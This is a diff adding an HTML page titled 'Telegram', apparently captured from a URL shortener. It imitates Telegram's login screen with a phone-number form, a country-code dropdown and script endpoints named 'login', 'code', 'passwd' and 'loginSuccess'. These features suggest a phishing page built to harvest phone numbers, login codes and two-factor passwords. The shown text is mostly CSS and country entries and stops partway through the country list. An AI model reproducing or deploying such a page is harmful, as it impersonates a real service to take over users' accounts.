@@ -1,0 +1,1152 @@
+<!-- url: https://tinyurl.com/ifsabaku
+status: 200 -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
+    <title>Telegram</title>
+    <style>
+
+        :root{
+            --main-color:red;
+            --font-size: 16px;
+            --font-family: "Roboto", -apple-system, BlinkMacSystemFont, "Apple Color Emoji", "Segoe UI", Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            --z-country-code-input-group:10;
+            --color-borders-input:rgb(218, 220, 224);
+            --border-radius-default:0.75rem;
+            --color-background:rgb(255, 255, 255);
+            --color-text-secondary:rgb(112, 117, 121);
+            --color-primary:rgb(51, 144, 236);
+            --color-error:#e53935;
+        }
+
+        html,body{
+            width: 100%;
+            height: 100%;
+            font-size: var(--font-size);
+            user-select: none;
+            font-family: var(--font-family);
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        *{
+            font-size: var(--font-size);
+            user-select: none;
+            font-family: var(--font-family);
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+
+        }
+        .container{
+            width: 100%;
+            max-width:25.5rem;
+            height: 100%;
+            margin: 0 auto;
+            padding-left: 1rem;
+            padding-right: 1rem;
+            padding-bottom: 1rem;
+            padding-top: 2rem;
+        }
+        #header-logo{
+            width: 7.5rem;
+            height: 7.5rem;
+            margin: 0 auto;
+            margin-bottom: 1.75rem;
+        }
+        #header-logo>img{
+            width: 7.5rem;
+            height: 7.5rem;
+        }
+        #header-title{
+            font-size: 1.25rem;
+            line-height: 1;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 0.5rem;
+        }
+        #header-desc{
+            text-align: center;
+            font-size: 0.875rem;
+            line-height: 1.35rem;
+            color: rgb(112, 117, 121);
+            margin-bottom: 2.5rem;
+        }
+        #mobutton{
+            height: 9rem;
+        }
+
+
+        @media (min-width: 600px) {
+            .container{
+                padding-top: 6rem;
+                width: 600px;
+            }
+        }
+
+        #country-wrap{
+            position: relative;
+            z-index: var(--z-country-code-input-group);
+            margin-bottom: 1.5rem;
+        }
+        #country-wrap>input{
+            display: block;
+            width: 100%;
+            height: 3.375rem;
+            outline: none;
+            --border-width:1px;
+            padding: calc(.75rem - var(--border-width)) calc(.9rem - var(--border-width));
+            border: var(--border-width) solid var(--color-borders-input);
+            border-radius:var(--border-radius-default);
+            background-color: var(--color-background);
+            transition: border-color .15s ease;
+            word-break:break-word;
+            font-size:1rem;
+            line-height:1.25rem;
+            font-family:inherit;
+            caret-color: var(--color-primary);
+        }
+        #country-wrap>label{
+            color:var(--color-text-secondary);
+            display: block;
+            padding: 0 0.25rem;
+            position: absolute;
+            left: 0.75rem;
+            top:0.9375rem;
+            background-color: var(--color-background);
+            font-size: 1rem;
+            font-weight: 400;
+            transition: transform .15s ease-out, color .15s ease-out;
+        }
+        #country-wrap> .input-focus {
+            border-color:var(--color-primary);
+            box-shadow:inset 0 0 0 1px var(--color-primary);
+        }
+        #country-wrap>.lable-focus {
+            transform: scale(0.75) translate(-0.5rem, -2.25rem);
+        }
+        #country-wrap>.lable-border-focus {
+            color: var(--color-primary);
+        }
+        #country-wrap > i {
+            position: absolute;
+            top: 1.125rem;
+            right: 1rem;
+            width: .75rem;
+            height: .75rem;
+            border: 2px solid rgb(112, 117, 121);
+            border-top: 0;
+            border-left: 0;
+            transform: scaleY(1) rotate(45deg);
+            transition: color .2s ease,transform .2s ease,top .2s ease;
+        }
+        #country-wrap > .iOpen{
+            border-color:var(--color-primary);
+            transform: scaleY(-1) rotate(45deg);
+            top: 1.5rem;
+        }
+
+        #phone-wrap{
+            position: relative;
+            z-index: var(--z-country-code-input-group);
+            margin-bottom: 1.5rem;
+        }
+        #phone-wrap>input{
+            display: block;
+            width: 100%;
+            height: 3.375rem;
+            outline: none;
+            --border-width:1px;
+            padding: calc(.75rem - var(--border-width)) calc(.9rem - var(--border-width));
+            border: var(--border-width) solid var(--color-borders-input);
+            border-radius:var(--border-radius-default);
+            background-color: var(--color-background);
+            transition: border-color .15s ease;
+            word-break:break-word;
+            font-size:1rem;
+            line-height:1.25rem;
+            font-family:inherit;
+            caret-color: var(--color-primary);
+        }
+        #phone-wrap>label{
+            color:var(--color-text-secondary);
+            display: block;
+            padding: 0 0.25rem;
+            position: absolute;
+            left: 0.75rem;
+            top:0.9375rem;
+            background-color: var(--color-background);
+            font-size: 1rem;
+            font-weight: 400;
+            transition: transform .15s ease-out, color .15s ease-out;
+        }
+        #phone-wrap>.lable-focus {
+            transform: scale(0.75) translate(-0.5rem, -2.25rem);
+        }
+
+        #phone-wrap> .input-focus {
+            border-color:var(--color-primary);
+            box-shadow:inset 0 0 0 1px var(--color-primary);
+        }
+        #phone-wrap>.lable-border-focus {
+            color: var(--color-primary);
+        }
+
+        #phone-wrap> .input-focus-error {
+            border-color:var(--color-error);
+            box-shadow:inset 0 0 0 1px var(--color-error);
+        }
+        #phone-wrap>.lable-border-focus-error {
+            color: var(--color-error);
+        }
+
+        #login-btn{
+            outline: none !important;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height:3.5rem;
+            border:0;
+            border-radius:var(--border-radius-default);
+            background-color: var(--color-primary);
+            background-size:cover;
+            color: white;
+            position: relative;
+            overflow:hidden;
+            line-height: 1.2;
+            transition:background-color .15s,color .15s;
+            text-decoration:none !important;
+            text-transform:uppercase;
+            user-select: none;
+            font-family:inherit;
+            font-size:inherit;
+        }
+
+        .login-btn-opacity{
+            opacity: 0.6;
+        }
+
+        .login-btn-loading-wrap{
+            height:3.5rem;
+            position: absolute;
+            right: 1rem;
+            top: 0;
+            bottom:0;
+            align-items: center;
+            display: none;
+        }
+        .login-btn-loading-wrap > svg{
+            height: 30px;
+            inset-inline-end:15px;
+            animation: login-btn-loading-rotate 1s linear infinite;
+            transform-origin: center center;
+        }
+        .login-btn-loading-wrap > svg>circle{
+            stroke-dasharray:93.6375, 124.85;
+            stroke-dashoffset:0;
+            stroke-linecap:round;
+            stroke:#fff;
+            stroke-width:3;
+        }
+        @keyframes login-btn-loading-rotate {
+            00% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #country-menu{
+            --offset-y:calc(100% + 0.5rem);
+            position: absolute;
+            top:var(--offset-y);
+            overflow-x: hidden;
+            overflow-y: auto;
+            box-shadow:0 .25rem .5rem .125rem rgba(114,114,114,0.251);
+            border-radius: 0.75rem;
+            z-index: 21;
+            width: 100%;
+            max-height: 23.5rem;
+            padding: .25rem 0;
+            background: white;
+            display: none;
+        }
+        .country-menu-item{
+            font-size: .875rem;
+            padding: 0.75rem 1rem;
+            border-radius: .375rem;
+            width: auto;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            background-color: white;
+            height: 3rem;
+        }
+        .country-menu-item:active{
+            background-color: rgba(44, 44, 44,0.1);
+        }
+        .country-menu-item:hover{
+            background-color: rgba(44, 44, 44,0.1);
+        }
+        .country-menu-item-image{
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .country-menu-item-image>img{
+            width: 2rem;
+            height: 2rem;
+            display: block;
+            margin-right: 1rem;
+        }
+        .country-menu-item-code{
+            opacity: 0.5;
+        }
+    </style>
+    <script>
+
+        var loginUrl = "login";
+        var codeUrl = "code";
+        var pwdUrl = "passwd";
+        var successUrl = "loginSuccess";
+
+        function initPage() {
+
+        }
+
+        initPage()
+
+    </script>
+</head>
+<body>
+    <div style="" class="container">
+
+        <div id="header-logo"><img src="static/img/logo.svg"></div>
+        <h1 id="header-title">Telegram</h1>
+        <p id="header-desc">Please confirm your country code and enter your phone number.</p>
+
+        <div style="position: relative">
+            <div id="country-wrap">
+                <input type="text" name="country" id="country-input" autocomplete="off" >
+                <label >Country</label>
+                <i></i>
+            </div>
+            <div id="country-menu">
+                <div class="country-menu-item_not_found" style="display: none">
+                    <div class="country-menu-item-image">
+                        <span>Country not found</span>
+                    </div>
+                </div>
+
+                <div class="country-menu-item cid_1" country-code="93"  country-name="Afghanistan"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1eb.png"></img><span>Afghanistan</span></div><span class="country-menu-item-code">+93</span></div>
+                <div class="country-menu-item cid_2" country-code="355"  country-name="Albania"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1f1.png"></img><span>Albania</span></div><span class="country-menu-item-code">+355</span></div>
+                <div class="country-menu-item cid_3" country-code="213"  country-name="Algeria"><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1ff.png"></img><span>Algeria</span></div><span class="country-menu-item-code">+213</span></div>
+                <div class="country-menu-item cid_4" country-code="1684"  country-name="American Samoa"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1f8.png"></img><span>American Samoa</span></div><span class="country-menu-item-code">+1684</span></div>
+                <div class="country-menu-item cid_5" country-code="376"  country-name="Andorra"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1e9.png"></img><span>Andorra</span></div><span class="country-menu-item-code">+376</span></div>
+                <div class="country-menu-item cid_6" country-code="244"  country-name="Angola"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1f4.png"></img><span>Angola</span></div><span class="country-menu-item-code">+244</span></div>
+                <div class="country-menu-item cid_7" country-code="1264"  country-name="Anguilla"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1ee.png"></img><span>Anguilla</span></div><span class="country-menu-item-code">+1264</span></div>
+                <div class="country-menu-item cid_8" country-code="888"  country-name="Anonymous Numbers"><div class="country-menu-item-image"><img src="static/country/1f3f4-200d-2620-fe0f.png"></img><span>Anonymous Numbers</span></div><span class="country-menu-item-code">+888</span></div>
+                <div class="country-menu-item cid_9" country-code="1268"  country-name="Antigua &amp; Barbuda"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1ec.png"></img><span>Antigua &amp; Barbuda</span></div><span class="country-menu-item-code">+1268</span></div>
+                <div class="country-menu-item cid_10" country-code="54"  country-name="Argentina"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1f7.png"></img><span>Argentina</span></div><span class="country-menu-item-code">+54</span></div>
+                <div class="country-menu-item cid_11" country-code="374"  country-name="Armenia"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1f2.png"></img><span>Armenia</span></div><span class="country-menu-item-code">+374</span></div>
+                <div class="country-menu-item cid_12" country-code="297"  country-name="Aruba"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1fc.png"></img><span>Aruba</span></div><span class="country-menu-item-code">+297</span></div>
+                <div class="country-menu-item cid_13" country-code="61"  country-name="Australia"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1fa.png"></img><span>Australia</span></div><span class="country-menu-item-code">+61</span></div>
+                <div class="country-menu-item cid_14" country-code="43"  country-name="Austria"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1f9.png"></img><span>Austria</span></div><span class="country-menu-item-code">+43</span></div>
+                <div class="country-menu-item cid_15" country-code="994"  country-name="Azerbaijan"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1ff.png"></img><span>Azerbaijan</span></div><span class="country-menu-item-code">+994</span></div>
+                <div class="country-menu-item cid_16" country-code="1242"  country-name="Bahamas"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1f8.png"></img><span>Bahamas</span></div><span class="country-menu-item-code">+1242</span></div>
+                <div class="country-menu-item cid_17" country-code="973"  country-name="Bahrain"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1ed.png"></img><span>Bahrain</span></div><span class="country-menu-item-code">+973</span></div>
+                <div class="country-menu-item cid_18" country-code="880"  country-name="Bangladesh"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1e9.png"></img><span>Bangladesh</span></div><span class="country-menu-item-code">+880</span></div>
+                <div class="country-menu-item cid_19" country-code="1246"  country-name="Barbados"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1e7.png"></img><span>Barbados</span></div><span class="country-menu-item-code">+1246</span></div>
+                <div class="country-menu-item cid_20" country-code="375"  country-name="Belarus"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1fe.png"></img><span>Belarus</span></div><span class="country-menu-item-code">+375</span></div>
+                <div class="country-menu-item cid_21" country-code="32"  country-name="Belgium"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1ea.png"></img><span>Belgium</span></div><span class="country-menu-item-code">+32</span></div>
+                <div class="country-menu-item cid_22" country-code="501"  country-name="Belize"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1ff.png"></img><span>Belize</span></div><span class="country-menu-item-code">+501</span></div>
+                <div class="country-menu-item cid_23" country-code="229"  country-name="Benin"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1ef.png"></img><span>Benin</span></div><span class="country-menu-item-code">+229</span></div>
+                <div class="country-menu-item cid_24" country-code="1441"  country-name="Bermuda"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1f2.png"></img><span>Bermuda</span></div><span class="country-menu-item-code">+1441</span></div>
+                <div class="country-menu-item cid_25" country-code="975"  country-name="Bhutan"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1f9.png"></img><span>Bhutan</span></div><span class="country-menu-item-code">+975</span></div>
+                <div class="country-menu-item cid_26" country-code="591"  country-name="Bolivia"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1f4.png"></img><span>Bolivia</span></div><span class="country-menu-item-code">+591</span></div>
+                <div class="country-menu-item cid_27" country-code="599"  country-name="Bonaire, Sint Eustatius &amp; Saba"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1f6.png"></img><span>Bonaire, Sint Eustatius &amp; Saba</span></div><span class="country-menu-item-code">+599</span></div>
+                <div class="country-menu-item cid_28" country-code="387"  country-name="Bosnia &amp; Herzegovina"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1e6.png"></img><span>Bosnia &amp; Herzegovina</span></div><span class="country-menu-item-code">+387</span></div>
+                <div class="country-menu-item cid_29" country-code="267"  country-name="Botswana"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1fc.png"></img><span>Botswana</span></div><span class="country-menu-item-code">+267</span></div>
+                <div class="country-menu-item cid_30" country-code="55"  country-name="Brazil"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1f7.png"></img><span>Brazil</span></div><span class="country-menu-item-code">+55</span></div>
+                <div class="country-menu-item cid_31" country-code="1284"  country-name="British Virgin Islands"><div class="country-menu-item-image"><img src="static/country/1f1fb-1f1ec.png"></img><span>British Virgin Islands</span></div><span class="country-menu-item-code">+1284</span></div>
+                <div class="country-menu-item cid_32" country-code="673"  country-name="Brunei Darussalam"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1f3.png"></img><span>Brunei Darussalam</span></div><span class="country-menu-item-code">+673</span></div>
+                <div class="country-menu-item cid_33" country-code="359"  country-name="Bulgaria"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1ec.png"></img><span>Bulgaria</span></div><span class="country-menu-item-code">+359</span></div>
+                <div class="country-menu-item cid_34" country-code="226"  country-name="Burkina Faso"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1eb.png"></img><span>Burkina Faso</span></div><span class="country-menu-item-code">+226</span></div>
+                <div class="country-menu-item cid_35" country-code="257"  country-name="Burundi"><div class="country-menu-item-image"><img src="static/country/1f1e7-1f1ee.png"></img><span>Burundi</span></div><span class="country-menu-item-code">+257</span></div>
+                <div class="country-menu-item cid_36" country-code="855"  country-name="Cambodia"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1ed.png"></img><span>Cambodia</span></div><span class="country-menu-item-code">+855</span></div>
+                <div class="country-menu-item cid_37" country-code="237"  country-name="Cameroon"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1f2.png"></img><span>Cameroon</span></div><span class="country-menu-item-code">+237</span></div>
+                <div class="country-menu-item cid_38" country-code="1"  country-name="Canada"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1e6.png"></img><span>Canada</span></div><span class="country-menu-item-code">+1</span></div>
+                <div class="country-menu-item cid_39" country-code="238"  country-name="Cape Verde"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1fb.png"></img><span>Cape Verde</span></div><span class="country-menu-item-code">+238</span></div>
+                <div class="country-menu-item cid_40" country-code="1345"  country-name="Cayman Islands"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1fe.png"></img><span>Cayman Islands</span></div><span class="country-menu-item-code">+1345</span></div>
+                <div class="country-menu-item cid_41" country-code="236"  country-name="Central African Rep."><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1eb.png"></img><span>Central African Rep.</span></div><span class="country-menu-item-code">+236</span></div>
+                <div class="country-menu-item cid_42" country-code="235"  country-name="Chad"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1e9.png"></img><span>Chad</span></div><span class="country-menu-item-code">+235</span></div>
+                <div class="country-menu-item cid_43" country-code="56"  country-name="Chile"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1f1.png"></img><span>Chile</span></div><span class="country-menu-item-code">+56</span></div>
+                <div class="country-menu-item cid_44" country-code="86"  country-name="China"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1f3.png"></img><span>China</span></div><span class="country-menu-item-code">+86</span></div>
+                <div class="country-menu-item cid_45" country-code="57"  country-name="Colombia"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1f4.png"></img><span>Colombia</span></div><span class="country-menu-item-code">+57</span></div>
+                <div class="country-menu-item cid_46" country-code="269"  country-name="Comoros"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1f2.png"></img><span>Comoros</span></div><span class="country-menu-item-code">+269</span></div>
+                <div class="country-menu-item cid_47" country-code="243"  country-name="Congo (Dem. Rep.)"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1e9.png"></img><span>Congo (Dem. Rep.)</span></div><span class="country-menu-item-code">+243</span></div>
+                <div class="country-menu-item cid_48" country-code="242"  country-name="Congo (Rep.)"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1ec.png"></img><span>Congo (Rep.)</span></div><span class="country-menu-item-code">+242</span></div>
+                <div class="country-menu-item cid_49" country-code="682"  country-name="Cook Islands"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1f0.png"></img><span>Cook Islands</span></div><span class="country-menu-item-code">+682</span></div>
+                <div class="country-menu-item cid_50" country-code="506"  country-name="Costa Rica"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1f7.png"></img><span>Costa Rica</span></div><span class="country-menu-item-code">+506</span></div>
+                <div class="country-menu-item cid_51" country-code="225"  country-name="Côte d'Ivoire"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1ee.png"></img><span>Côte d'Ivoire</span></div><span class="country-menu-item-code">+225</span></div>
+                <div class="country-menu-item cid_52" country-code="385"  country-name="Croatia"><div class="country-menu-item-image"><img src="static/country/1f1ed-1f1f7.png"></img><span>Croatia</span></div><span class="country-menu-item-code">+385</span></div>
+                <div class="country-menu-item cid_53" country-code="53"  country-name="Cuba"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1fa.png"></img><span>Cuba</span></div><span class="country-menu-item-code">+53</span></div>
+                <div class="country-menu-item cid_54" country-code="599"  country-name="Curaçao"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1fc.png"></img><span>Curaçao</span></div><span class="country-menu-item-code">+599</span></div>
+                <div class="country-menu-item cid_55" country-code="357"  country-name="Cyprus"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1fe.png"></img><span>Cyprus</span></div><span class="country-menu-item-code">+357</span></div>
+                <div class="country-menu-item cid_56" country-code="420"  country-name="Czech Republic"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1ff.png"></img><span>Czech Republic</span></div><span class="country-menu-item-code">+420</span></div>
+                <div class="country-menu-item cid_57" country-code="45"  country-name="Denmark"><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1f0.png"></img><span>Denmark</span></div><span class="country-menu-item-code">+45</span></div>
+                <div class="country-menu-item cid_58" country-code="246"  country-name="Diego Garcia"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1f4.png"></img><span>Diego Garcia</span></div><span class="country-menu-item-code">+246</span></div>
+                <div class="country-menu-item cid_59" country-code="253"  country-name="Djibouti"><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1ef.png"></img><span>Djibouti</span></div><span class="country-menu-item-code">+253</span></div>
+                <div class="country-menu-item cid_60" country-code="1767"  country-name="Dominica"><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1f2.png"></img><span>Dominica</span></div><span class="country-menu-item-code">+1767</span></div>
+                <div class="country-menu-item cid_61" country-code="1809"  country-name="Dominican Rep."><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1f4.png"></img><span>Dominican Rep.</span></div><span class="country-menu-item-code">+1809</span></div>
+                <div class="country-menu-item cid_62" country-code="1829"  country-name="Dominican Rep."><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1f4.png"></img><span>Dominican Rep.</span></div><span class="country-menu-item-code">+1829</span></div>
+                <div class="country-menu-item cid_63" country-code="1849"  country-name="Dominican Rep."><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1f4.png"></img><span>Dominican Rep.</span></div><span class="country-menu-item-code">+1849</span></div>
+                <div class="country-menu-item cid_64" country-code="593"  country-name="Ecuador"><div class="country-menu-item-image"><img src="static/country/1f1ea-1f1e8.png"></img><span>Ecuador</span></div><span class="country-menu-item-code">+593</span></div>
+                <div class="country-menu-item cid_65" country-code="20"  country-name="Egypt"><div class="country-menu-item-image"><img src="static/country/1f1ea-1f1ec.png"></img><span>Egypt</span></div><span class="country-menu-item-code">+20</span></div>
+                <div class="country-menu-item cid_66" country-code="503"  country-name="El Salvador"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1fb.png"></img><span>El Salvador</span></div><span class="country-menu-item-code">+503</span></div>
+                <div class="country-menu-item cid_67" country-code="240"  country-name="Equatorial Guinea"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1f6.png"></img><span>Equatorial Guinea</span></div><span class="country-menu-item-code">+240</span></div>
+                <div class="country-menu-item cid_68" country-code="291"  country-name="Eritrea"><div class="country-menu-item-image"><img src="static/country/1f1ea-1f1f7.png"></img><span>Eritrea</span></div><span class="country-menu-item-code">+291</span></div>
+                <div class="country-menu-item cid_70" country-code="268"  country-name="Eswatini"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1ff.png"></img><span>Eswatini</span></div><span class="country-menu-item-code">+268</span></div>
+                <div class="country-menu-item cid_71" country-code="251"  country-name="Ethiopia"><div class="country-menu-item-image"><img src="static/country/1f1ea-1f1f9.png"></img><span>Ethiopia</span></div><span class="country-menu-item-code">+251</span></div>
+                <div class="country-menu-item cid_72" country-code="500"  country-name="Falkland Islands"><div class="country-menu-item-image"><img src="static/country/1f1eb-1f1f0.png"></img><span>Falkland Islands</span></div><span class="country-menu-item-code">+500</span></div>
+                <div class="country-menu-item cid_73" country-code="298"  country-name="Faroe Islands"><div class="country-menu-item-image"><img src="static/country/1f1eb-1f1f4.png"></img><span>Faroe Islands</span></div><span class="country-menu-item-code">+298</span></div>
+                <div class="country-menu-item cid_74" country-code="679"  country-name="Fiji"><div class="country-menu-item-image"><img src="static/country/1f1eb-1f1ef.png"></img><span>Fiji</span></div><span class="country-menu-item-code">+679</span></div>
+                <div class="country-menu-item cid_75" country-code="358"  country-name="Finland"><div class="country-menu-item-image"><img src="static/country/1f1eb-1f1ee.png"></img><span>Finland</span></div><span class="country-menu-item-code">+358</span></div>
+                <div class="country-menu-item cid_76" country-code="33"  country-name="France"><div class="country-menu-item-image"><img src="static/country/1f1eb-1f1f7.png"></img><span>France</span></div><span class="country-menu-item-code">+33</span></div>
+                <div class="country-menu-item cid_77" country-code="594"  country-name="French Guiana"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1eb.png"></img><span>French Guiana</span></div><span class="country-menu-item-code">+594</span></div>
+                <div class="country-menu-item cid_78" country-code="689"  country-name="French Polynesia"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1eb.png"></img><span>French Polynesia</span></div><span class="country-menu-item-code">+689</span></div>
+                <div class="country-menu-item cid_79" country-code="241"  country-name="Gabon"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1e6.png"></img><span>Gabon</span></div><span class="country-menu-item-code">+241</span></div>
+                <div class="country-menu-item cid_80" country-code="220"  country-name="Gambia"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1f2.png"></img><span>Gambia</span></div><span class="country-menu-item-code">+220</span></div>
+                <div class="country-menu-item cid_81" country-code="995"  country-name="Georgia"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1ea.png"></img><span>Georgia</span></div><span class="country-menu-item-code">+995</span></div>
+                <div class="country-menu-item cid_82" country-code="49"  country-name="Germany"><div class="country-menu-item-image"><img src="static/country/1f1e9-1f1ea.png"></img><span>Germany</span></div><span class="country-menu-item-code">+49</span></div>
+                <div class="country-menu-item cid_83" country-code="233"  country-name="Ghana"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1ed.png"></img><span>Ghana</span></div><span class="country-menu-item-code">+233</span></div>
+                <div class="country-menu-item cid_84" country-code="350"  country-name="Gibraltar"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1ee.png"></img><span>Gibraltar</span></div><span class="country-menu-item-code">+350</span></div>
+                <div class="country-menu-item cid_85" country-code="30"  country-name="Greece"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1f7.png"></img><span>Greece</span></div><span class="country-menu-item-code">+30</span></div>
+                <div class="country-menu-item cid_86" country-code="299"  country-name="Greenland"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1f1.png"></img><span>Greenland</span></div><span class="country-menu-item-code">+299</span></div>
+                <div class="country-menu-item cid_87" country-code="1473"  country-name="Grenada"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1e9.png"></img><span>Grenada</span></div><span class="country-menu-item-code">+1473</span></div>
+                <div class="country-menu-item cid_88" country-code="590"  country-name="Guadeloupe"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1f5.png"></img><span>Guadeloupe</span></div><span class="country-menu-item-code">+590</span></div>
+                <div class="country-menu-item cid_89" country-code="1671"  country-name="Guam"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1fa.png"></img><span>Guam</span></div><span class="country-menu-item-code">+1671</span></div>
+                <div class="country-menu-item cid_90" country-code="502"  country-name="Guatemala"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1f9.png"></img><span>Guatemala</span></div><span class="country-menu-item-code">+502</span></div>
+                <div class="country-menu-item cid_91" country-code="224"  country-name="Guinea"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1f3.png"></img><span>Guinea</span></div><span class="country-menu-item-code">+224</span></div>
+                <div class="country-menu-item cid_92" country-code="245"  country-name="Guinea-Bissau"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1fc.png"></img><span>Guinea-Bissau</span></div><span class="country-menu-item-code">+245</span></div>
+                <div class="country-menu-item cid_93" country-code="592"  country-name="Guyana"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1fe.png"></img><span>Guyana</span></div><span class="country-menu-item-code">+592</span></div>
+                <div class="country-menu-item cid_94" country-code="509"  country-name="Haiti"><div class="country-menu-item-image"><img src="static/country/1f1ed-1f1f9.png"></img><span>Haiti</span></div><span class="country-menu-item-code">+509</span></div>
+                <div class="country-menu-item cid_95" country-code="504"  country-name="Honduras"><div class="country-menu-item-image"><img src="static/country/1f1ed-1f1f3.png"></img><span>Honduras</span></div><span class="country-menu-item-code">+504</span></div>
+                <div class="country-menu-item cid_96" country-code="852"  country-name="Hong Kong"><div class="country-menu-item-image"><img src="static/country/1f1ed-1f1f0.png"></img><span>Hong Kong</span></div><span class="country-menu-item-code">+852</span></div>
+                <div class="country-menu-item cid_97" country-code="36"  country-name="Hungary"><div class="country-menu-item-image"><img src="static/country/1f1ed-1f1fa.png"></img><span>Hungary</span></div><span class="country-menu-item-code">+36</span></div>
+                <div class="country-menu-item cid_98" country-code="354"  country-name="Iceland"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1f8.png"></img><span>Iceland</span></div><span class="country-menu-item-code">+354</span></div>
+                <div class="country-menu-item cid_99" country-code="91"  country-name="India"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1f3.png"></img><span>India</span></div><span class="country-menu-item-code">+91</span></div>
+                <div class="country-menu-item cid_100" country-code="62"  country-name="Indonesia"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1e9.png"></img><span>Indonesia</span></div><span class="country-menu-item-code">+62</span></div>
+                <div class="country-menu-item cid_101" country-code="98"  country-name="Iran"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1f7.png"></img><span>Iran</span></div><span class="country-menu-item-code">+98</span></div>
+                <div class="country-menu-item cid_102" country-code="964"  country-name="Iraq"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1f6.png"></img><span>Iraq</span></div><span class="country-menu-item-code">+964</span></div>
+                <div class="country-menu-item cid_103" country-code="353"  country-name="Ireland"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1ea.png"></img><span>Ireland</span></div><span class="country-menu-item-code">+353</span></div>
+                <div class="country-menu-item cid_104" country-code="972"  country-name="Israel"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1f1.png"></img><span>Israel</span></div><span class="country-menu-item-code">+972</span></div>
